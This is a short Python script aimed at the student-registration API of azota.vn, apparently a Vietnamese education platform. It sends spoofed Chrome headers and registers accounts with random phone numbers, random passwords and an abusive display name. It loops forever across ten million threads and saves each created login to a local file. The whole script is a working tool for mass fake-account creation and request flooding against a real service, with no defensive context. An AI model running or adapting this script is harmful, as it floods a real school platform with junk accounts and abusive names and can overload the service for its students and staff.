import requests,random,string,threading
def main():
  headers = {
    'authority': 'azota.vn',
    'sec-ch-ua': '"Google Chrome";v="95", "Chromium";v="95", ";Not A Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'authorization': 'Bearer',
    'content-type': 'application/json',
    'accept': 'application/json, text/plain, */*',
    'user-agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36',
    'azts': 's',
    'sec-ch-ua-platform': '"Windows"',
    'origin': 'https://azota.vn',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://azota.vn/vi/auth/register',
    'accept-language': 'en-US,en;q=0.9',
    'cookie': '',
}
  while True:
    st = ''.join((random.choice(string.ascii_lowercase) for x in range(20)))
    sdt = random.randint(1000000000,99999999999)
    data = '{"phone":"'+str(sdt)+'","fullname":"Like A Bitch","password":"'+st+'"}'
    response = requests.post('https://azota.vn/api/Auth/registerForStudent', headers=headers, data=data)
    if "success" in response.text:
      out = f"{sdt}|{st}"
      open("azota.txt","a+").write(f'{out}\n')
      print(out)
    else:
      pass
for i in range(10000000):
  new_thread = threading.Thread(target=main, args=()).start()